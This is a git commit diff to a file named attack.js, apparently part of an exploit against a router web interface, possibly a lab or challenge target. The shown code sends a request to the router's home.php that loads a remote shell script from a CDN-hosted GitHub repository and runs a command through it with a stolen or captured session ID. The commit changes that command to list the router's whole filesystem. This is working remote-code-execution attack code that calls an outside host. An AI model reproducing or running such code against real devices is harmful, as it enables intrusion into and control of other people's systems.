870436c8deedd7ad77e2fd7674c915b7150d5041
Daniel Spencer <danielspencer305@hotmail.co.uk>
2022-03-06 14:17:29 -0500

    List all files on router

--- attack.js
+++ attack.js
@@ -33,7 +33,7 @@ xhr.onreadystatechange = function() {
 		}
 
 		const SHELL = "https://cdn.jsdelivr.net/gh/dspencer12/bobsrouter@0.29/shell";
-		const cmd = "ls ..";
+		const cmd = "ls -R /";
 
 		xhr2.open("GET", ROUTER + "/home.php?action=" + encodeURIComponent(SHELL) + "&x=" + encodeURIComponent(cmd) + "&PHPSESSID=" + sessionId, true);
 		xhr2.send('');
